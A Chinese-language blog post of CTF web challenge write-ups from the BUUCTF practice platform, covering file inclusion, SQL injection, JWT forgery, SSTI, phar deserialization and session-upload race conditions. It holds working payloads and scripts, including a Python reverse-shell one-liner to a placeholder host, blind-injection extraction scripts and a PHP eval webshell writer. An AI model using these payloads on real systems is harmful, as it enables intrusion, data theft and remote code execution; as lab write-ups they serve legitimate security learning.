---
title: "BUUCTF Web Writeup 6"
date: 2022-09-26T19:36:33+08:00
lastmod: 2022-09-26T19:36:33+08:00
draft: true
author: "X1r0z"

tags: []
categories: []

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

<!--more-->

## [网鼎杯 2020 白虎组]PicDown

存在文件包含

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210181704878.png)

其实是非预期了... 题目环境有点问题

真正的做法是利用 proc 中的 cmdline 和 fd

参考文章 [](https://www.anquanke.com/post/id/241148)

大致总结一下

```
/proc/self/cmdline 启动当前进程的完整命令
/proc/self/cwd/ 指向当前进程的运行目录
/proc/self/exe 指向启动当前进程的可执行文件
/proc/self/environ 当前进程的环境变量列表
/proc/self/fd/ 当前进程已打开文件的文件描述符
```

首先通过 cmdline 读取执行的命令

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210181709405.png)

这里感觉应该也能够通过 app.py main.py web.py site.py 等关键词来猜测运行的脚本名

读取 app.py

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210181709022.png)

```python
from flask import Flask, Response
from flask import render_template
from flask import request
import os
import urllib

app = Flask(__name__)

SECRET_FILE = "/tmp/secret.txt"
f = open(SECRET_FILE)
SECRET_KEY = f.read().strip()
os.remove(SECRET_FILE)


@app.route('/')
def index():
    return render_template('search.html')


@app.route('/page')
def page():
    url = request.args.get("url")
    try:
        if not url.lower().startswith("file"):
            res = urllib.urlopen(url)
            value = res.read()
            response = Response(value, mimetype='application/octet-stream')
            response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg'
            return response
        else:
            value = "HACK ERROR!"
    except:
        value = "SOMETHING WRONG!"
    return render_template('search.html', res=value)


@app.route('/no_one_know_the_manager')
def manager():
    key = request.args.get("key")
    print(SECRET_KEY)
    if key == SECRET_KEY:
        shell = request.args.get("shell")
        os.system(shell)
        res = "ok"
    else:
        res = "Wrong Key!"

    return res


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

`/no_one_know_the_manager` 路由中可以通过 os.system 无回显执行命令, 但是要验证 secret key

secret key 在 /tmp/secret.txt 里面, 并且读取之后利用 os.remove 删除了文件

```python
SECRET_FILE = "/tmp/secret.txt"
f = open(SECRET_FILE)
SECRET_KEY = f.read().strip()
os.remove(SECRET_FILE)
```

注意程序使用 open 来读取文件, 但是在删除之后并没有执行 close 方法

根据上面的参考文章可知 secret.txt 的文件描述符依然存在于 /proc/self/fd 中, 于是我们通过该目录来获取文件内容

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210181715999.png)

id 试到 3 时出来了一串字符, 猜测为 secret key

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210181716285.png)

最后反弹 shell

```python
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("x.x.x.x",yyyy));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210181720886.png)

## [CISCN2019 总决赛 Day2 Web1]Easyweb

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210181725857.png)

robots.txt

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210181725561.png)

根据右键源代码得知有 user.php image.php index.php 三个文件

试到 image.php.bak 时发现能下载

```php
<?php
include "config.php";

$id=isset($_GET["id"])?$_GET["id"]:"1";
$path=isset($_GET["path"])?$_GET["path"]:"";

$id=addslashes($id);
$path=addslashes($path);

$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
$path=str_replace(array("\\0","%00","\\'","'"),"",$path);

$result=mysqli_query($con,"select * from images where id='{$id}' or path='{$path}'");
$row=mysqli_fetch_array($result,MYSQLI_ASSOC);

$path="./" . $row["path"];
header("Content-Type: image/jpeg");
readfile($path);
```

登录的地方没发现 sql 注入, 也没有弱口令, 问题只能出在 image.php 上

两次 str_replace 过滤单双引号等字符, 其中过滤的 `\0` 感觉不太对劲

本地试了下, 如果输入 `\0`, 被 addslashes 转义之后就是 `\\0`, 之后被 replace 成 `\`, 这样就可以使得后面跟着的单引号逃逸出来

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210182005288.png)

程序后面的 readfile 是依据 `$row["path"]` 来读取文件的, 于是尝试用 union 构造数据

```
id=123\0&path=+union+select+1,0x757365722e706870+#
```

读取 user.php

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210182007558.png)

读取 config.php 和 ../../../../flag 都不行, 看了下网站上的 image.php 发现被过滤了

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210182008083.png)

那么只有 sql 注入一条路了

简单盲注无任何过滤, 脚本如下

```python
import requests
import time

url = 'http://03e9b380-2c82-4b43-b760-4157d9a13c20.node4.buuoj.cn:81/image.php'

dicts = r'{}_,AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'

flag = ''

for i in range(1,99999):
    for s in dicts:
        time.sleep(0.2)
        params = {
        'id': '1\\0',
        'path': 'and if(ascii(substr((select group_concat(username,0x2c,password) from users),{},1))={},1,0) #'.format(i,ord(s))
        }
        print(s)
        res = requests.get(url, params=params)
        if len(res.text) >100:
            flag += s
            print('FOUND!!!',flag)
            break
```

md5 解不出来, 回过头看 index.php 的时候发现对传入 password 压根就没有 md5 加密...

于是拿着 md5 直接登录

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210182009394.png)

有一处上传, 配合 sql 注入去读取 upload.php

正则明明过滤了却还能读到, 很奇怪...

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210182014852.png)

上传时把 filename 改成 php 代码

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210182017187.png)

访问 log 文件

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210182018890.png)

## [HITCON 2017]SSRFme

```php
<?php
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];
}

echo $_SERVER["REMOTE_ADDR"];

$sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);
@mkdir($sandbox);
@chdir($sandbox);

$data = shell_exec("GET " . escapeshellarg($_GET["url"]));
$info = pathinfo($_GET["filename"]);
$dir  = str_replace(".", "", basename($info["dirname"]));
@mkdir($dir);
@chdir($dir);
@file_put_contents(basename($info["basename"]), $data);
highlight_file(__FILE__);
```

题目名称是 ssrf, 但是这里存在 `file_put_contents`, filename 也没有过滤

vps 挂着 php 代码, 然后通过 GET 命令下载到网站上另存为 a.php

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210182049477.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210182049844.png)

执行根目录下的 readflag 得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210182050823.png)

然后看 wp 的时候发现自己又非预期了...

正确的思路是利用 perl open 函数的命令执行漏洞来 getshell

参考文章 [](https://lorexxar.cn/2017/11/10/hitcon2017-writeup/#ssrfme)

这里就不写了

## [watevrCTF-2019]Cookie Store

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210191026089.png)

session 的值是 base64

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210191027438.png)

改完 money 后重新编码一次, 然后购买 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210191027201.png)

flag 在 cookie 里

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210191027777.png)

## [红明谷CTF 2021]write_shell

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
function check($input){
    if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)){
        // if(preg_match("/'| |_|=|php/",$input)){
        die('hacker!!!');
    }else{
        return $input;
    }
}

function waf($input){
  if(is_array($input)){
      foreach($input as $key=>$output){
          $input[$key] = waf($output);
      }
  }else{
      $input = check($input);
  }
}

$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
if(!file_exists($dir)){
    mkdir($dir);
}
switch($_GET["action"] ?? "") {
    case 'pwd':
        echo $dir;
        break;
    case 'upload':
        $data = $_GET["data"] ?? "";
        waf($data);
        file_put_contents("$dir" . "index.php", $data);
}
?>
```

简单代码执行, payload 如下

```
http://72a9085b-f56b-4fb4-b464-5c88c8f806af.node4.buuoj.cn:81/?action=upload&data=<?=`ls\$IFS\$9/`?>
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210191037089.png)

查看 flag

```
http://72a9085b-f56b-4fb4-b464-5c88c8f806af.node4.buuoj.cn:81/?action=upload&data=<?=`cat</flllllll1112222222lag`?>
```

## [b01lers2020]Welcome to Earth

跟着源代码一直走

```javascript
// Run to scramble original flag
//console.log(scramble(flag, action));
function scramble(flag, key) {
  for (var i = 0; i < key.length; i++) {
    let n = key.charCodeAt(i) % flag.length;
    let temp = flag[i];
    flag[i] = flag[n];
    flag[n] = temp;
  }
  return flag;
}

function check_action() {
  var action = document.getElementById("action").value;
  var flag = ["{hey", "_boy", "aaaa", "s_im", "ck!}", "_baa", "aaaa", "pctf"];

  // TODO: unscramble function
}
```

随便拼接一下

```
pctf{hey_boys_im_baaaaaaaaaack!}
```

## [HFCTF2020]EasyLogin

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210191503529.png)

右键查看源代码, 发现 app.js

```javascript
/**
 *  或许该用 koa-static 来处理静态文件
 *  路径该怎么配置？不管了先填个根目录XD
 */

function login() {
    const username = $("#username").val();
    const password = $("#password").val();
    const token = sessionStorage.getItem("token");
    $.post("/api/login", {username, password, authorization:token})
        .done(function(data) {
            const {status} = data;
            if(status) {
                document.location = "/home";
            }
        })
        .fail(function(xhr, textStatus, errorThrown) {
            alert(xhr.responseJSON.message);
        });
}

function register() {
    const username = $("#username").val();
    const password = $("#password").val();
    $.post("/api/register", {username, password})
        .done(function(data) {
            const { token } = data;
            sessionStorage.setItem('token', token);
            document.location = "/login";
        })
        .fail(function(xhr, textStatus, errorThrown) {
            alert(xhr.responseJSON.message);
        });
}

function logout() {
    $.get('/api/logout').done(function(data) {
        const {status} = data;
        if(status) {
            document.location = '/login';
        }
    });
}

function getflag() {
    $.get('/api/flag').done(function(data) {
        const {flag} = data;
        $("#username").val(flag);
    }).fail(function(xhr, textStatus, errorThrown) {
        alert(xhr.responseJSON.message);
    });
}
```

感觉注释不太对劲, 猜测可能会有源码泄露

搜了一下发现 koa 是基于 nodejs 的 web 框架, 目录结构如下

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210191505662.png)

访问 app.js

```javascript
const Koa = require('koa');
const bodyParser = require('koa-bodyparser');
const session = require('koa-session');
const static = require('koa-static');
const views = require('koa-views');

const crypto = require('crypto');
const { resolve } = require('path');

const rest = require('./rest');
const controller = require('./controller');

const PORT = 3000;
const app = new Koa();

app.keys = [crypto.randomBytes(16).toString('hex')];
global.secrets = [];

app.use(static(resolve(__dirname, '.')));

app.use(views(resolve(__dirname, './views'), {
  extension: 'pug'
}));

app.use(session({key: 'sses:aok', maxAge: 86400000}, app));

// parse request body:
app.use(bodyParser());

// prepare restful service
app.use(rest.restify());

// add controllers:
app.use(controller());

app.listen(PORT);
console.log(`app started at port ${PORT}...`);
```

/controllers/api.js

```javascript
const crypto = require('crypto');
const fs = require('fs')
const jwt = require('jsonwebtoken')

const APIError = require('../rest').APIError;

module.exports = {
    'POST /api/register': async (ctx, next) => {
        const {username, password} = ctx.request.body;

        if(!username || username === 'admin'){
            throw new APIError('register error', 'wrong username');
        }

        if(global.secrets.length > 100000) {
            global.secrets = [];
        }

        const secret = crypto.randomBytes(18).toString('hex');
        const secretid = global.secrets.length;
        global.secrets.push(secret)

        const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});

        ctx.rest({
            token: token
        });

        await next();
    },

    'POST /api/login': async (ctx, next) => {
        const {username, password} = ctx.request.body;

        if(!username || !password) {
            throw new APIError('login error', 'username or password is necessary');
        }

        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;

        const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;

        console.log(sid)

        if(sid === undefined || sid === null || !(sid < global.secrets.length && sid >= 0)) {
            throw new APIError('login error', 'no such secret id');
        }

        const secret = global.secrets[sid];

        const user = jwt.verify(token, secret, {algorithm: 'HS256'});

        const status = username === user.username && password === user.password;

        if(status) {
            ctx.session.username = username;
        }

        ctx.rest({
            status
        });

        await next();
    },

    'GET /api/flag': async (ctx, next) => {
        if(ctx.session.username !== 'admin'){
            throw new APIError('permission error', 'permission denied');
        }

        const flag = fs.readFileSync('/flag').toString();
        ctx.rest({
            flag
        });

        await next();
    },

    'GET /api/logout': async (ctx, next) => {
        ctx.session.username = null;
        ctx.rest({
            status: true
        })
        await next();
    }
};
```

估计是考察 jwt 安全, 首先试试看把加密算法设置为空能不能成功 

先注册一个用户让 secretid 填充到 global.secrets 数组内, 方便后续绕过

然后在 sessionStorage 中查看 token

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210191538851.png)

注意一下 `if(sid === undefined || sid === null || !(sid < global.secrets.length && sid >= 0))` 的绕过

javascript 也是一种弱类型语言, 不同类型进行比较时也会有类型转换

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210191534910.png)

这里用 0e123 来绕过, 其实用空数组也可以

最后构造 payload

```python
import time
import jwt

info = {'iat': int(time.time()),
    "secretid": "0e123",
    "username": "admin",
    "password": "admin"}

token = jwt.encode(info,key="",algorithm="none")

print(token)
```

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpYXQiOjE2NjYxNjQ3MzcsInNlY3JldGlkIjoiMGUxMjMiLCJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiJ9.
```

登录, 比较顺利

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210191540607.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210191541544.png)

查看 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210191541879.png)

## [GYCTF2020]Ezsqli

sql 注入, 过滤了 and or case when if time benchmark 等等

不过注入点是整数型的, 可以直接在 id 处放表达式

本地测试如下

```bash
mysql> select * from users where id=(length(user())=0);
Empty set (0.00 sec)

mysql> select * from users where id=(length(user())<0);
Empty set (0.00 sec)

mysql> select * from users where id=(length(user())>0);
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row in set (0.00 sec)
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210191624571.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210191625027.png)

information_schema 被过滤了, 因为含有 or

恰好 mysql 版本为 5.7, 于是利用 sys 库中的表来跑表名

```sql
(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),1,1))='f')
```

列名跑不了, 尝试无列名注入, 这里用 ascii 比较盲注

基本形式如下, 列数是手工试出来的

```sql
((select 1,'f')>(select * from f1ag_1s_h3r3_hhhhh))
```

当然这个 payload 目前还有点问题, 比如不能区分大小写 (binary 含有 in 被过滤了)

(绕过 binary 过滤来区分大小写的参考文章 [](https://nosec.org/home/detail/3830.html))

不过对于本题读取 flag 来说是不影响的

```python
import requests
import time

url = 'http://51adf432-9f40-474e-bd18-cfb31b37f4c3.node4.buuoj.cn:81/index.php'

#dicts = r'{}_,.-0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz'
dicts = r'-0123456789abcdefgl{}'

flag = ''

for i in range(1,99999):
    for s in dicts:
        time.sleep(0.2)
        #payload = '(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),{},1))={})'.format(i, ord(s))
        payload = "((select 1,'{}')>(select * from f1ag_1s_h3r3_hhhhh))".format(flag + s)
        print(s)
        res = requests.post(url,data={'id':payload})
        if 'Nu1L' in res.text:
            flag += dicts[dicts.index(s) -1]
            print('FOUND!!!',flag)
            break
```

注意 dicts 中的字符要按 ascii 顺序排列

## [网鼎杯 2018]Comment

题目思路很新奇, 最后是看了 wp 才完整的做出来的...

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201430381.png)

/js/panel.js

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201431741.png)

暗示有 git 仓库, 并且文件在暂存区, 也就是 add 了但是没有 commit

留言板需要登陆

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201432346.png)

这里看到默认已经填了一个用户 `zhangwei/zhangwei***`, `***` 感觉可能是数字

于是用 burp intruder 爆破, 结果是 `zhangwei/zhangwei666`

githacker 获取 git 仓库

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201435536.png)

write_do.php

```php
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}
if(isset($_GET['do'])){
switch ($_GET['do'])
{
case 'write':
    break;
case 'comment':
    break;
default:
    header("Location: ./index.php");
}
}
else{
    header("Location: ./index.php");
}
?>
```

文件内容不全, 于是用 `git log --reflog` 查看改动记录

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201436891.png)

文件被暂存到 stash 了, 用 `git stash pop` 恢复工作区

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201437004.png)

完整内容如下

```php
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}
if(isset($_GET['do'])){
switch ($_GET['do'])
{
case 'write':
    $category = addslashes($_POST['category']);
    $title = addslashes($_POST['title']);
    $content = addslashes($_POST['content']);
    $sql = "insert into board
            set category = '$category',
                title = '$title',
                content = '$content'";
    $result = mysql_query($sql);
    header("Location: ./index.php");
    break;
case 'comment':
    $bo_id = addslashes($_POST['bo_id']);
    $sql = "select category from board where id='$bo_id'";
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    if($num>0){
    $category = mysql_fetch_array($result)['category'];
    $content = addslashes($_POST['content']);
    $sql = "insert into comment
            set category = '$category',
                content = '$content',
                bo_id = '$bo_id'";
    $result = mysql_query($sql);
    }
    header("Location: ./comment.php?id=$bo_id");
    break;
default:
    header("Location: ./index.php");
}
}
else{
    header("Location: ./index.php");
}
?>
```

case 为 write 时, post 提交的内容都经过了 addslashes, 但是 comment 的时候却直接从数据库中取出 category 的内容拼接到 sql 语句中, 因此 category 这里存在二次注入

这里比较坑的点在于 comment 时的 sql

```php
$sql = "insert into comment
        set category = '$category',
            content = '$content',
            bo_id = '$bo_id'";
```

因为是多行, 所以注释要用 `/**/`, 而且单行注释仅能注释该行后面的内容, 对于下一行是没有影响的

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201442568.png)

write 时构造 payload

```sql
category=1',content=(select user()),/*
```

comment 时构造 payload

```sql
content=*/#
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201446302.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201446023.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201446089.png)

然后组合成 python 脚本

```python
import requests
import re

cookies = {
    'PHPSESSID': 'rd6h57gjrcu2pi6ujp1k4g7uc6'
}

def post(sql):
    data = {
    'title': '123',
    'category': "1',content=(" + sql + "), /*",
    'content': '123'
    }
    _ = requests.post('http://7017a807-8655-4192-856c-4a8b3638f244.node4.buuoj.cn:81/write_do.php?do=write',data=data, cookies=cookies)

def getid():
    res = requests.get('http://7017a807-8655-4192-856c-4a8b3638f244.node4.buuoj.cn:81/', cookies=cookies)
    id_list = re.findall('value=\'(.*)\'', res.text)
    return id_list[-1]


def comment(bo_id):
    data = {
    'content': '*/#',
    'bo_id': bo_id
    }
    _ = requests.post('http://7017a807-8655-4192-856c-4a8b3638f244.node4.buuoj.cn:81/write_do.php?do=comment',data=data, cookies=cookies)
    res = requests.get('http://7017a807-8655-4192-856c-4a8b3638f244.node4.buuoj.cn:81/comment.php?id=' + bo_id, cookies=cookies)
    res.encoding = "utf-8"
    print(re.findall(r'留言<\/label><div class="col-sm-5"><p>([\s\S]*)<\/p><\/div>', res.text)[0])

sql = "select concat(database(),',',version(),',',user())"
post(sql)
comment(getid())
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201459076.png)

读取 /etc/passwd

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201501054.png)

www 用户的 home 目录一般都是 /var/www, 而这里是 /home/www, 感觉不太对劲

尝试读取 /home/www/.bash_history

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201507658.png)

注意到 `.DS_Store`, 该文件是 macos 生成的隐藏文件, 可能会泄露当前目录的相关信息, 例如目录下所有文件的文件名

这里删除了 /var/www/html/ 下的 `.DS_Store`, 但是 /tmp/html 下的还在

首先利用 load_file + hex 读取该文件

```sql
select hex(load_file('/tmp/html/.DS_Store'))
```

然后本地再转成二进制文件

```sql
select unhex(load_file('d:/hex.txt')) into dumpfile 'd:/DS_Store'
```

最后用工具读取

 [](https://github.com/gehaxelt/Python-dsstore)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201526638.png)

读取 `flag_8946e1ff1ee3e40f.php` 得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201527927.png)

## [SWPUCTF 2018]SimplePHP

简单 phar 反序列化

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210211618534.png)

查看文件处有文件读取

```
http://96c57946-ef6a-4e1b-8ad0-47294a76515a.node4.buuoj.cn:81/file.php?file=
```

file.php

```php
<?php 
header("content-type:text/html;charset=utf-8");  
include 'function.php'; 
include 'class.php'; 
ini_set('open_basedir','/var/www/html/'); 
$file = $_GET["file"] ? $_GET['file'] : ""; 
if(empty($file)) { 
    echo "<h2>There is no file to show!<h2/>"; 
} 
$show = new Show(); 
if(file_exists($file)) { 
    $show->source = $file; 
    $show->_show(); 
} else if (!empty($file)){ 
    die('file doesn\'t exists.'); 
} 
?> 
```

class.php

```php
<?php
class C1e4r
{
    public $test;
    public $str;
    public function __construct($name)
    {
        $this->str = $name;
    }
    public function __destruct()
    {
        $this->test = $this->str;
        echo $this->test;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file)
    {
        $this->source = $file;   //$this->source = phar://phar.jpg
        echo $this->source;
    }
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }
    public function __set($key,$value)
    {
        $this->$key = $value;
    }
    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }
        
    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}
class Test
{
    public $file;
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __get($key)
    {
        return $this->get($key);
    }
    public function get($key)
    {
        if(isset($this->params[$key])) {
            $value = $this->params[$key];
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}
?>
```

function.php

```php
<?php 
//show_source(__FILE__); 
include "base.php"; 
header("Content-type: text/html;charset=utf-8"); 
error_reporting(0); 
function upload_file_do() { 
    global $_FILES; 
    $filename = md5($_FILES["file"]["name"].$_SERVER["REMOTE_ADDR"]).".jpg"; 
    //mkdir("upload",0777); 
    if(file_exists("upload/" . $filename)) { 
        unlink($filename); 
    } 
    move_uploaded_file($_FILES["file"]["tmp_name"],"upload/" . $filename); 
    echo '<script type="text/javascript">alert("上传成功!");</script>'; 
} 
function upload_file() { 
    global $_FILES; 
    if(upload_file_check()) { 
        upload_file_do(); 
    } 
} 
function upload_file_check() { 
    global $_FILES; 
    $allowed_types = array("gif","jpeg","jpg","png"); 
    $temp = explode(".",$_FILES["file"]["name"]); 
    $extension = end($temp); 
    if(empty($extension)) { 
        //echo "<h4>请选择上传的文件:" . "<h4/>"; 
    } 
    else{ 
        if(in_array($extension,$allowed_types)) { 
            return true; 
        } 
        else { 
            echo '<script type="text/javascript">alert("Invalid file!");</script>'; 
            return false; 
        } 
    } 
} 
?>
```

payload

```php
<?php

class C1e4r
{
    public $test;
    public $str;

}

class Show
{
    public $source;
    public $str;

}
class Test
{
    public $file;
    public $params;

}


$c = new Test();
$c->params = Array("source"=>"/var/www/html/f1ag.php");

$b = new Show();
$b->str = Array("str"=>$c);

$a = new C1e4r();
$a->str = $b;

$phar =new Phar("phar.phar"); 
$phar->startBuffering();
$phar->setStub("GIF89A<?php XXX __HALT_COMPILER(); ?>");
$phar->setMetadata($a); 
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
```

最后注意一下上传后保存的文件名为 `md5($_FILES["file"]["name"].$_SERVER["REMOTE_ADDR"]).".jpg"`, 网页右上角可以看到 remote addr

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210211619359.png)

## [NCTF2019]SQLi

`try to make the sqlquery have its own results`

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210211724399.png)

robots.txt 里可以看到 hint.txt, 内容如下

```
$black_list = "/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\'|=| |in|<|>|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i";


If $_POST['passwd'] === admin's password,

Then you will get the flag;
```

select 被过滤了, 基本上是查不出什么数据 (表名, 列名)

猜测是通过反斜杠逃逸单引号然后用万能密码

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210211726105.png)

passwd 可以填 `||1` 来实现万能密码, 但是单引号的闭合是个问题, `#` `--+` `%00` 都被过滤了

看了 wp 发现闭合方式用的是 `;%00`, `%00` 截断的条件如下

> php < 5.3.4, 且 magic_quotes_gpc = Off 时可进行 `%00` 截断

但是 X-Powered-By 里的 php 版本是 5.6.40, 很奇怪...

payload 如下

```
username=123\&passwd=||1;%00
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210211742633.png)

之后会跳转到 welcome.php, 但是这个文件并不存在

想了想根据 hint 的提示, 那只能去弄出 admin 的 password

发现黑名单中没有 regexp, 恰好双引号也没被过滤, 于是尝试利用 regexp 来注入

password 的字段猜测就为 `passwd` (与 post 提交的参数名一致)

python 脚本如下

```python
import requests
import time

url = 'http://edee5920-a1cf-4615-b4fb-81e7e628618c.node4.buuoj.cn:81/index.php'

dicts = '_0123456789abcdefghijklmnopqrstuvwxyz'

headers = {
    "Content-Type":"application/x-www-form-urlencoded"
}

flag = ''

for i in range(1, 99999):
    for s in dicts:
        time.sleep(0.2)
        payload = '/**/||/**/passwd/**/regexp/**/"^{}";%00'.format(flag + s)
        print(s)
        res = requests.post(url,data='username=123\\&passwd=' + payload, headers=headers, allow_redirects=False)
        if 'alert(' not in res.text:
            flag += s
            print('FOUND!!!',flag)
            break
```

跑出来结果是 `you_will_never_know7788990`

提交后得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210211749067.png)

## [RootersCTF2019]I_<3_Flask

简单 ssti

```
http://011d25fa-762b-4cd9-a1d8-b4dd5b395707.node4.buuoj.cn:81/?name={{config.__class__.__init__.__globals__['os']['popen']('cat flag.txt').read()}}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210211802475.png)

## [NPUCTF2020]ezinclude

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210211924594.png)

发现 hash 会随着用户名改变而改变, 然后根据下面的注释将 hash 填到 pass 里重新提交

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210211925046.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210211925331.png)

文件包含, 试了下常规的日志路径都不行, 于是尝试利用 session\_upload\_progress 进行包含

```python
import threading
import requests

target = 'http://1bc9083e-6533-47ba-8a6c-3edc3b051e00.node4.buuoj.cn:81/flflflflag.php'
flag = 'hello'

def upload():
    files = [
        ('file', ('xx.txt', 'xxx'*10240)),
    ]
    data = {'PHP_SESSION_UPLOAD_PROGRESS': "<?php file_put_contents('/tmp/xzxzxz', '<?php eval($_REQUEST[1]);phpinfo();?>');?>"}

    while True:
        res = requests.post(
            target,
            data=data,
            files=files,
            cookies={'PHPSESSID': flag},
        )



def write():
    while True:
        response = requests.get(
            f'{target}?file=/tmp/sess_{flag}',
        )
        print('write',response.text)
        if 'phpinfo' in response.text:
            print('success')

for i in range(2):
    t1 = threading.Thread(target=upload)
    t2 = threading.Thread(target=write)
    t1.start()
    t2.start()
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210211926665.png)

system 等函数被禁用了, flag 在 phpinfo 里

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210211926293.png)

看 wp 的时候发现自己非预期了... 预期解是利用 php://filter 的过滤器让 php 进程崩溃, 然后在 dir.php 下能够看到 /tmp 目录下的临时文件名称, 最后通过包含临时文件来 getshell

参考文章

